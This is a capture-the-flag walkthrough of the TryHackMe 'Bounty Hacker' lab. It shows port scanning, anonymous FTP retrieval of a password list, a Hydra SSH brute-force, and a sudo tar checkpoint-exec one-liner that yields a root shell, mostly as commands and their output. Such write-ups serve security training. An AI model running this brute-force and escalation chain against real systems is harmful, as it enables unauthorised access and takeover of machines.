# Bounty Hacker

Link to the room: https://tryhackme.com/room/cowboyhacker

## Let's start !!

First, we set an IP variable

````````
export IP=10.10.3.202
````````

### Rustscan 

As always we start with rustscan I like its style and it instantly gives a response after discovering an open port. The drawback is that we cannot scan it for UDP.

````````
rustscan -a $IP -- -A -sC -oN nmap.txt
````````

````````python
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.3.202:21
Open 10.10.3.202:22
Open 10.10.3.202:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-28 22:03 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:03
Completed NSE at 22:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:03
Completed NSE at 22:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:03
Completed NSE at 22:03, 0.00s elapsed
Initiating Ping Scan at 22:03
Scanning 10.10.3.202 [4 ports]
Completed Ping Scan at 22:03, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:03
Completed Parallel DNS resolution of 1 host. at 22:03, 0.07s elapsed
DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 22:03
Scanning 10.10.3.202 [3 ports]
Discovered open port 21/tcp on 10.10.3.202
Discovered open port 80/tcp on 10.10.3.202
Discovered open port 22/tcp on 10.10.3.202
Completed SYN Stealth Scan at 22:03, 0.23s elapsed (3 total ports)
Initiating Service scan at 22:03
Scanning 3 services on 10.10.3.202
Completed Service scan at 22:03, 6.56s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.3.202
Retrying OS detection (try #2) against 10.10.3.202
Initiating Traceroute at 22:03
Completed Traceroute at 22:03, 0.21s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 22:03
Completed Parallel DNS resolution of 2 hosts. at 22:03, 0.08s elapsed
DNS resolution of 2 IPs took 0.08s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.3.202.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:03
NSE: [ftp-bounce 10.10.3.202:21] PORT response: 500 Illegal PORT command.
NSE Timing: About 99.76% done; ETC: 22:03 (0:00:00 remaining)
Completed NSE at 22:03, 31.35s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:03
Completed NSE at 22:03, 1.38s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:03
Completed NSE at 22:03, 0.00s elapsed
Nmap scan report for 10.10.3.202
Host is up, received echo-reply ttl 63 (0.20s latency).
Scanned at 2022-05-28 22:03:08 IST for 44s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.126.243
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgcwCtWTBLYfcPeyDkCNmq6mXb/qZExzWud7PuaWL38rUCUpDu6kvqKMLQRHX4H3vmnPE/YMkQIvmz4KUX4H/aXdw0sX5n9jrennTzkKb/zvqWNlT6zvJBWDDwjv5g9d34cMkE9fUlnn2gbczsmaK6Zo337F40ez1iwU0B39e5XOqhC37vJuqfej6c/C4o5FcYgRqktS/kdcbcm7FJ+fHH9xmUkiGIpvcJu+E4ZMtMQm4bFMTJ58bexLszN0rUn17d2K4+lHsITPVnIxdn9hSc3UomDrWWg+hWknWDcGpzXrQjCajO395PlZ0SBNDdN+B14E0m6lRY9GlyCD9hvwwB
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMCu8L8U5da2RnlmmnGLtYtOy0Km3tMKLqm4dDG+CraYh7kgzgSVNdAjCOSfh3lIq9zdwajW+1q9kbbICVb07ZQ=
|   256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICqmJn+c7Fx6s0k8SCxAJAoJB7pS/RRtWjkaeDftreFw
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.1 (92%), Linux 3.2 (92%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (91%), HP P2000 G3 NAS device (91%), Crestron XPanel control system (90%), Linux 2.6.32 (89%), Linux 2.6.39 - 3.2 (89%), Infomir MAG-250 set-top box (89%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (89%), Linux 3.1 - 3.2 (89%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=5/28%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=62924EF0%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=10F%TI=Z%II=I%TS=A)
SEQ(SP=105%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)
WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
ECN(R=Y%DF=Y%TG=40%W=F507%O=M505NNSNW6%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 2.600 days (since Thu May 26 07:40:15 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   196.76 ms 10.8.0.1
2   197.33 ms 10.10.3.202

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:03
Completed NSE at 22:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:03
Completed NSE at 22:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:03
Completed NSE at 22:03, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.63 seconds
           Raw packets sent: 79 (6.968KB) | Rcvd: 37 (2.308KB)


````````
Here we have 3 ports open 21,22,80. First, let us check FTP(21)...

### FTP

````````
ftp $IP
````````

````````python
Connected to 10.10.3.202.
220 (vsFTPd 3.0.3)
Name (10.10.3.202:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||5586|)
ftp: Can't connect to `10.10.3.202:5586': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> mget *
mget locks.txt [anpqy?]? 
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |********************************************************************************************************************************|   418        7.81 MiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (2.06 KiB/s)
mget task.txt [anpqy?]? 
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |********************************************************************************************************************************|    68        1.24 MiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.33 KiB/s)
ftp>

```````` 
We have 2 files one is task.txt and locks.txt. when we view them we can find a user called lin and another is wordlist may be...


### Hydra 

let's brute-force the user lin over ssh...

````````
hydra -l lin -P locks.txt ssh://$IP
````````

````````python
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-28 22:34:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.3.202:22/
[22][ssh] host: 10.10.3.202   login: lin   password: {REDACTED}
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-28 22:34:23


````````
so, we have the password of lin, lets login via ssh and get our first flag

## Getting user.txt

````````
pwncat-cs lin@$IP
````````

````````python
[22:36:15] Welcome to pwncat 🐈!                                                                                                                              __main__.py:164
Password: ******************
[22:36:23] 10.10.3.202:22: registered new host w/ db                                                                                                           manager.py:957
(local) pwncat$                                                                                                                                                              
(remote) lin@bountyhacker:/home/lin/Desktop$ ls
user.txt
(remote) lin@bountyhacker:/home/lin/Desktop$ cat user.txt 
{REDACTED}
(remote) lin@bountyhacker:/home/lin/Desktop$ 

````````

## Privilage Esculation (Getting root.txt)

````````python
(remote) lin@bountyhacker:/home/lin/Desktop$ sudo -l
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
(remote) lin@bountyhacker:/home/lin/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh  
tar: Removing leading `/' from member names
\[\](remote)\[\] \[\]root@bountyhacker\[\]:\[\]/home/lin/Desktop\[\]$ whoami
root
\[\](remote)\[\] \[\]root@bountyhacker\[\]:\[\]/home/lin/Desktop\[\]$ cd /root
\[\](remote)\[\] \[\]root@bountyhacker\[\]:\[\]/root\[\]$ ls
root.txt
\[\](remote)\[\] \[\]root@bountyhacker\[\]:\[\]/root\[\]$ cat root.txt
{REDACTED}
\[\](remote)\[\] \[\]root@bountyhacker\[\]:\[\]/root\[\]$ 
````````
- Done 
